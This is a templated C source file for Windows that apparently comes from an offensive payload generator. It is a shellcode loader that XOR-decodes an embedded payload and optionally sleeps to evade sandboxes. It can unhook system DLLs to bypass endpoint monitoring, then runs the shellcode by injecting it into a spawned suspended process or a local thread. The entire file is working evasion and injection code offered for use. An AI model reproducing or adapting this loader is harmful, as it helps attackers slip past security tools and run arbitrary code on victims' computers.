#include <stdio.h>
#include <string.h>
#include <processthreadsapi.h>
#include <windows.h>
#include <conio.h>
#include <psapi.h>


const char shellcode[] = "{{ shellcode }}";
const char key[] = "{{ key }}";
char decoded_shellcode[{{ shellcode_length }}];

char* decode() {
  for(int i = 0; i < {{ shellcode_length }}; i++) {
    decoded_shellcode[i] = shellcode[i] ^ key[i % {{ key_length }}];
  }

  return decoded_shellcode;
}

{% if options.unhook_dll %}
void unhook(const char* internal_name, const char* filepath) {
  HANDLE process = GetCurrentProcess();
  MODULEINFO mi = {};
  HMODULE ntdllModule = GetModuleHandleA(internal_name);

  GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
  LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
  HANDLE ntdllFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
  HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
  LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
  PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
  PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

  for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

    if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
      DWORD oldProtection = 0;
      BOOL isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
      memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
      isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
    }
  }

  CloseHandle(process);
  CloseHandle(ntdllFile);
  CloseHandle(ntdllMapping);
  FreeLibrary(ntdllModule);
}
{% endif %}

{% if options.remote_inject %}
void spawn_inject_remote_process() {
  STARTUPINFO si = {0};
  PROCESS_INFORMATION pi = {0};

  si.cb = sizeof(si);
  BOOL creationResult = CreateProcess("{{ options.remote_inject_executable.replace('\\', '\\\\') }}", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

  if(creationResult) {
    PVOID remoteBuff = VirtualAllocEx(pi.hProcess, NULL, {{shellcode_length}}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteBuff, decoded_shellcode, {{shellcode_length}}, NULL);
    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuff, NULL, 0, NULL);

    // Keep the program open.
    getch();
  }
  else {
    exit(-1);
  }

  CloseHandle(pi.hProcess);
}
{% endif %}

{% if options.local_thread_execution %}
void local_thread_execution() {

  PVOID localBuff = VirtualAlloc(NULL, {{shellcode_length}}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  if(localBuff != NULL){

    memcpy(localBuff, decoded_shellcode ,{{shellcode_length}});
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)localBuff, NULL, 0, NULL);

    // Keep the program open.
    getch();
  }
  else {
    exit(-1);
  }
}
{% endif %}

int main() {
  {% if options.sleep_evasion and options.sleep_evasion > 0 %}
  Sleep({{ options.sleep_evasion * 1000 }});
  {% endif %}


  {% if options.unhook_dll %}
  {% for dll in options.unhook_dll %}
  unhook("{{ dll.split('\\')[-1] }}", "{{ dll }}");
  {% endfor %}
  {% endif %}

  char* decoded_shellcode = decode();

  {% if options.remote_inject %}
  spawn_inject_remote_process();
  {% endif %}

  {% if options.local_thread_execution %}
  local_thread_execution();
  {% endif %}
  return 0;
}
